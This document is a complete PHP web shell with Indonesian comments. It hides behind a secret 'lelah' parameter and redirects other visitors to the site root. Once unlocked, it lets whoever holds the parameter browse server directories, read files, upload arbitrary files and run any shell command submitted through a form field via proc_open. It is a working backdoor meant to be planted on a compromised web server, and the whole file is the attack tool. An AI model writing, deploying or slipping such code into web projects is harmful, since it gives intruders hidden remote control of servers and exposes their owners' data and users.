<?php

error_reporting(0); 
set_time_limit(0);

if (!isset($_GET['lelah']) && !isset($_POST['lelah'])) {
    header("Location: /");
    exit;
}

// Ambil path sekarang, default ke current dir
$initial_path = realpath(getcwd());
$path = null;
if (isset($_GET['path'])) {
    $tmp = realpath($_GET['path']);
    if ($tmp && is_dir($tmp)) {
        $path = $tmp;
    }
}
if (!$path) {
    $path = $initial_path;
}

// Fungsi agar path aman (tidak keluar dari root initial_path)
function safe_path($path, $root) {
    $real = realpath($path);
    return ($real && strpos($real, $root) === 0) ? $real : false;
}

// Handle upload
if (isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    $filetmp  = $_FILES['file']['tmp_name'];
    $target = $path . DIRECTORY_SEPARATOR . $filename;
    if (move_uploaded_file($filetmp, $target)) {
        echo "[OK] Upload berhasil: " . htmlspecialchars($filename) . "<br>";
    } else {
        echo "[ERROR] Upload gagal!<br>";
    }
}

// Handle shell command
$output = '';
if (isset($_POST['xmd'])) {
    $xmd = $_POST['xmd'];
    chdir($path);

    $descriptors = [
      0 => ['pipe', 'r'], // stdin
      1 => ['pipe', 'w'], // stdout
      2 => ['pipe', 'w'], // stderr
    ];

    $process = proc_open($xmd, $descriptors, $pipes);

    if (is_resource($process)) {
        fclose($pipes[0]);

        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);

        proc_close($process);

        if ($error) {
            $output .= "\nError:\n" . $error;
        }
    } else {
        $output = "Gagal menjalankan perintah.";
    }
}

// Handle lihat isi file
$file_view_content = '';
if (isset($_GET['view'])) {
    $file_to_view = safe_path($path . DIRECTORY_SEPARATOR . $_GET['view'], $initial_path);
    if ($file_to_view && is_file($file_to_view)) {
        $file_view_content = htmlspecialchars(file_get_contents($file_to_view));
    } else {
        $file_view_content = "File tidak ditemukan atau akses ditolak.";
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>File Manager & Shell</title>
<style>
    body { font-family: monospace; background:#121212; color:#eee; padding:20px; }
    a { color:#61dafb; text-decoration:none; }
    a:hover { text-decoration:underline; }
    .folder, .file { margin-left:20px; }
    textarea { width: 100%; height: 300px; background:#222; color:#0f0; border:none; padding:10px; }
    form { margin-top: 10px; }
</style>
</head>
<body>

<h2>Path: <?=htmlspecialchars($path)?></h2>
<a href="?lelah=&path=<?=urlencode(dirname($path))?>">⬅️ Up one directory</a>

<h3>Folders & Files:</h3>
<ul>
<?php
$items = scandir($path);
foreach ($items as $item) {
    if ($item === '.') continue;
    if ($item === '..') continue;
    $full = $path . DIRECTORY_SEPARATOR . $item;
    if (is_dir($full)) {
        echo '<li class="folder">📁 <a href="?lelah=&path=' . urlencode($full) . '">' . htmlspecialchars($item) . '</a></li>';
    } else {
        echo '<li class="file">📄 <a href="?lelah=&path=' . urlencode($path) . '&view=' . urlencode($item) . '">' . htmlspecialchars($item) . '</a></li>';
    }
}
?>
</ul>

<?php if ($file_view_content !== ''): ?>
    <h3>Isi File: <?=htmlspecialchars($_GET['view'])?></h3>
    <textarea readonly><?= $file_view_content ?></textarea>
<?php endif; ?>

<h3>Upload File</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <input type="hidden" name="lelah" value="">
    <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
    <input type="submit" value="Upload">
</form>

<h3>Terminal</h3>
<form method="POST">
    <input type="text" name="xmd" size="50" placeholder="Masukkan perintah shell" autocomplete="off" required>
    <input type="hidden" name="lelah" value="">
    <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
    <input type="submit" value="Jalankan">
</form>

<?php if ($output !== ''): ?>
    <h3>Output Terminal</h3>
    <textarea readonly><?= htmlspecialchars($output) ?></textarea>
<?php endif; ?>

</body>
</html>
